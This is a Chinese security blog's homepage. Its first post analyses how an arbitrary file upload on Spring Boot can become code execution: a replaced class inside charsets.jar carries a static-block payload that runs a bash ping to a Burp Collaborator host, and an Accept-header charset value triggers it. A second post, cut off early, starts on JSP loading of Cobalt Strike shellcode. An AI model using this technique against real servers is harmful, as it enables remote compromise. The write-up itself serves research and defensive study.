<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Spring Boot Fat Jar 写文件getshell技术分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-04-16 11:31:57" itemprop="dateCreated datePublished" datetime="2021-04-16T11:31:57+08:00">2021-04-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-04-22 10:38:25" itemprop="dateModified" datetime="2021-04-22T10:38:25+08:00">2021-04-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞利用</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    之前在审计的过程中发现，很多JAVA开发的网站经常使用springboot，而springboot又是可以独立于tomcat部署web项目的，而且在不做特殊配置的情况下，也并不解析jsp文件，当时也在想，如果在渗透的过程中发现了一个任意文件上传漏洞，并且目标网站没有内置jsp或者jspx的解析引擎，我该如何getshell？</p>
<p>​        以我目前的知识积累来看，在linux下且高权限的情况下，可以通过写入计划任务反弹shell。在windows下高权下可以通过写自启动的方式getshell，但是使用这些方式显然要求都比较高，一方面是需要高权限，另一方面在windows下可能有些上传点并不支持上传exe或者dll，也需要等到程序下次启动时才能上线，但是对于服务器来讲，可能管理员很久也不上来操作，这显然也是不行的。后来也想过替换jar包的方式getshell，但想到jar在运行期间替换也是不可行的。最近刚好看到<a href="https://landgrey.me/blog/22/" target="_blank" rel="noopener">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a>,作者通过分析JDK中自带且在运行期间默认没有加载的JAR完成了getshell的操作，我本着学习的态度写下了这个文章。</p>
<h2 id="JAVA的类加载"><a href="#JAVA的类加载" class="headerlink" title="JAVA的类加载"></a>JAVA的类加载</h2><p>​        一个类的生命周期主要经过下面这几个阶段，我们主要关注的是<strong>类加载</strong>阶段。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210416140018288.png" alt="image-20210416140018288"></p>
<p><strong>类加载阶段主要做了什么?</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、通过一个类的全限定名来获取定义此类的二进制字节流。</span><br><span class="line">2、将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。</span><br><span class="line">3、在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入</span><br><span class="line">口。</span><br></pre></td></tr></table></figure>

<p><strong>可以通过什么途径加载class文件?</strong></p>
<p>JAVA中获取class文件的方式并不单一，可以通过下面的方式获取class文件，当然比较常用的方式还是通过jar包或者本地的class文件获取。</p>
<ul>
<li>从本地系统中直接加载</li>
<li>通过网络下载.class文件</li>
<li>从zip，jar等归档文件中加载.class文件</li>
<li>从专有数据库中提取.class文件</li>
<li>将Java源文件动态编译为.class文件</li>
</ul>
<p>​    并不需要等到某个类被使用时才去加载，，JVM规范允许类加载器在预料某个类将要被使用时就预先加载它。比如当虚拟机启动时，会去加载JAVA_HOME/jre/lib/下的rt.jar下的.class文件文件。我们编写一个简单类测试下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello word!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在启动时加入<code>-XX:+TraceClassLoading</code>参数即可获得加载信息，可以看到加载了<code>JAVA_HOME/lib/rt.jar</code>的多个类,并没有加载其他<code>JAVA_HOME/jre/lib/</code>目录下其他jar包下的类。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210416142615877.png" alt="image-20210416142615877"></p>
<p>​        由于我们需要测试的是springboot打包的WEB项目，所以也可以搭建一个简单的springboot web项目，看看会加载哪些JAR？我编写了一个空的springBoot web项目，经过测试会在启动是加载下面的4个JDK自带的jar，可以看到这里明显是加载了charsets.jar，似乎和LandGrey文章里提到的不太一样。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210416145449763.png" alt="image-20210416145449763"></p>
<p>​        经过问题排查，在使用maven编译打包是，会生成一个xml文件，在这个配置文件中有GBK编码的设置。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210416172809628.png" alt="image-20210416172809628"></p>
<p>​        当使用maven编译跳过测试打包时，则不会生成surefire-reports目录，下面再测试下是否加载了charsets.jar。经过测试还是会加载charsets.jar，可能再下面的几个依赖包中都有设置字符集的操作吧。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210416174146598.png" alt="image-20210416174146598"></p>
<p>​        显然这几个文件在程序运行中想要替换是不行的，会拒绝访问，没有加载的JAR则可以直接替换。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421101821075.png" alt="image-20210421101821075"></p>
<p>​        使用作者在github上提供的<a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/tree/main/fatJarWriteFileRCE" target="_blank" rel="noopener">测试代码</a>来分析是否加载了charsets.jar，发现在springboot程序启动的过程中还是会open下面的三个系统jar,所以理论上是不可以替换这三个jar文件的。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421102356931.png" alt="image-20210421102356931"></p>
<p>​        这样测试的结果并不准确，使用handle.exe可以看到程序依赖的所有jar文件。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421112205926.png" alt="image-20210421112205926"></p>
<p>​        这些jar文件显然也不能直接覆盖利用，但在linux下执行并不会加载charsets.jar文件，所以作者说到的覆盖charsets.jar这种思路目前只适用于Linux场景，不过问题不大，一般Linux跑spingboot项目会遇到的比较多。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421112702354.png" alt="image-20210421112702354"></p>
<p>​        和windows类似，直接通过查看系统调用可以看到具体依赖哪些jar文件。 </p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421134828346.png" alt="image-20210421134828346"></p>
<p>​        虽然Linux下确实没有加载Charsets.jar，但是我还有下面的疑问</p>
<ul>
<li><p>已经Opened过的jar在Linux下能否覆盖？</p>
<p>​    经过测试，在Linux下即使程序正在运行中，也可以直接通过上传覆盖系统的jar文件。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421143003473.png" alt="image-20210421143003473"></p>
<p>既然在linux中可以在运行时覆盖系统的jar包，我们能不能直接覆盖一个已经被load的类？虽然确实可以这么做，但是由于springboot项目在启动时已经将ri.jar或者jsse.jar中的class加载到虚拟机了，所以即使在后面需要使用这个类，会直接从JVM虚拟机中直接加载执行，而不会再将这些类重新Load。</p>
</li>
<li><p>springboot启动会不会将jar中的所有类全部加载？</p>
<p>经过测试，springboot并不会在启动时将某个加载的jar的所有class类进行加载，以jfr.jar为例，也仅仅加载了<code>jdk.jfr.internal.EventWriter</code>,这个也非常容易理解，如果每次需要加载某个class都需要将对应jar里的所有class都加载一遍，对JVM来说也是一个很大的性能损耗。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421152915142.png" alt="image-20210421152915142"></p>
<p>通过上面的分析和测试，无论springboot在Linux中是否加载了Charsets.jar文件，我们都可以找一个不常用的类来触发我们的payload。</p>
</li>
</ul>
<h2 id="JAVA类的初始化"><a href="#JAVA类的初始化" class="headerlink" title="JAVA类的初始化"></a>JAVA类的初始化</h2><p>​        前面我们大致了解了类的加载，但是加载了类并不代表我们的逻辑被执行，所以还要了解一下类的初始化阶段？</p>
<p><strong>类的初始化主要做什么？</strong></p>
<ul>
<li>执行&lt; clinit &gt;(静态变量及其赋值语句、静态代码块、静态方法）</li>
<li>虚拟机会保证在子类&lt; clinit &gt;的执行之前，父类的&lt; clinit &gt;()先执行</li>
</ul>
<p><strong>什么时候会触发类的初始化？</strong></p>
<p>​        下面的几种情况会进行类的初始化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用new关键字实例化对象</span><br><span class="line">读取或设置一个类型的静态字段</span><br><span class="line">使用java.lang.reflect包的方法对类型进行反射调用的时候</span><br><span class="line">当初始化类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化</span><br><span class="line">当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先初始化这个主类</span><br></pre></td></tr></table></figure>

<p><strong>类初始化注意事项</strong></p>
<p>​    同一个类加载器下，一个类型只会被初始化一 次。</p>
<p>通过上面的分析，我们可以尝试将恶意代码放到某个没有被load的static代码块中，只要找到触发这个类完成初始化的方法，即可执行我们的恶意代码。</p>
<h2 id="主动触发的初始化"><a href="#主动触发的初始化" class="headerlink" title="主动触发的初始化"></a>主动触发的初始化</h2><p>​        在<code>org.springframework.web.accept.HeaderContentNegotiationStrategy#resolveMediaTypes</code>中，会去接收<strong>Accept</strong>参数。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421163653495.png" alt="image-20210421163653495"></p>
<p>​        在<code>org.springframework.util.MimeTypeUtils#parseMimeTypeInternal</code>中会对accapt请求头的内容进行解析。将<code>;</code>后的内容放到LinkedHashMap中。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421164135404.png" alt="image-20210421164135404"></p>
<p>​        在<code>org.springframework.util.MimeType#MimeType(java.lang.String, java.lang.String, java.util.Map&lt;java.lang.String,java.lang.String&gt;)</code>中解析parameters的值，并调用了<code>org.springframework.util.MimeType#checkParameters</code>。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421164443669.png" alt="image-20210421164443669"></p>
<p>​        在<code>org.springframework.util.MimeType#checkParameters</code>中会去检查key是否为charset如果是则通过<code>Charset.forName(value);</code>加载charsets.jar中的某个类。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421164455715.png" alt="image-20210421164455715"></p>
<p>​        当某个类没有加载过时，会执行这个类的static静态代码块。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210421165942332.png" alt="image-20210421165942332"></p>
<p>​        所以可以选择某个不太常用的编码方式的static静态代码块进行替换，来执行我们的恶意代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.nio.cs.ext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Big5_HKSCS</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        fun();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> java.util.<span class="function">HashMap&lt;String, String&gt; <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String[] command = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"ping -c 1 bxcrq03prifaz03loenphr30wr2iq7.burpcollaborator.net"</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e1)&#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        编译文件后，将编译好的Big5_HKSCS.class文件放到charsets.jar中，上传修改过的jar文件，由于charsets.jar文件比较大3M左右，所以上传时间会比较长。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210422092318446.png" alt="image-20210422092318446"></p>
<p>​        最终通过设置Accept头触发恶意代码。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210422092420169.png" alt="image-20210422092420169"></p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/E:%5CmyBlog%5Chexo%5Csource_posts%5CSpring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%5Cimage-20210422092627792.png" alt="image-20210422092627792"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        总的来说这种利用这种方式需要一些条件，利用成本也比较高。</p>
<ul>
<li>需要以高权限的方式开启springboot</li>
<li>跨任意目录上传</li>
<li>对于charsets.jar来说windows启动会加载并占用，无法在运行期间覆盖，所以并不适用</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">jsp文件加载shellcode上线cobaltstrike实现</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-05 13:50:51" itemprop="dateCreated datePublished" datetime="2021-01-05T13:50:51+08:00">2021-01-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-06 17:40:05" itemprop="dateModified" datetime="2021-01-06T17:40:05+08:00">2021-01-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        之前浏览github时候发现<code>https://github.com/Ramos-dev/R9000/blob/master/README.md</code>项目，作者实现了通过JAVA加载shellcode上线cobaltstrike的功能，因为关于JAVA加载shellcode上线cobaltstrike的文章和方法不是很多，其免杀的情况也不清楚，因此打算写一篇文章复现和分析如何通过<code>JAVA加载shellcode上线cobaltstrike</code>。</p>
<p>​        通过查阅资料，目前已有的方法是用过JNI和JNA来实现注入shellcode的，所以先了解下JNI。</p>
<h2 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h2><h3 id="什么是JNI"><a href="#什么是JNI" class="headerlink" title="什么是JNI?"></a>什么是JNI?</h3><p>​    <strong>JNI</strong>是Java Native Interface的缩写，即Java本地接口。 它定义了一种虚拟机中的Java代码与用C/C++编写的本地代码交互的方式。支持从动态库中加载代码。使用JNI技术可以通过JAVA调用C/C++代码，也可以通过C/C++的代码调用Java的代码。</p>
<h3 id="为什么使用JNI？"><a href="#为什么使用JNI？" class="headerlink" title="为什么使用JNI？"></a>为什么使用JNI？</h3><ul>
<li>可以复用C/C++实现好的动态链接库。</li>
<li>编译为so/dll文件相对于JAVA class对象更加安全</li>
<li>C/C++开发更偏向底层，运行效率更高，也能使JAVA访问底层的特性。</li>
</ul>
<h3 id="如何使用JNI？"><a href="#如何使用JNI？" class="headerlink" title="如何使用JNI？"></a>如何使用JNI？</h3><p><strong>编写JAVA类</strong></p>
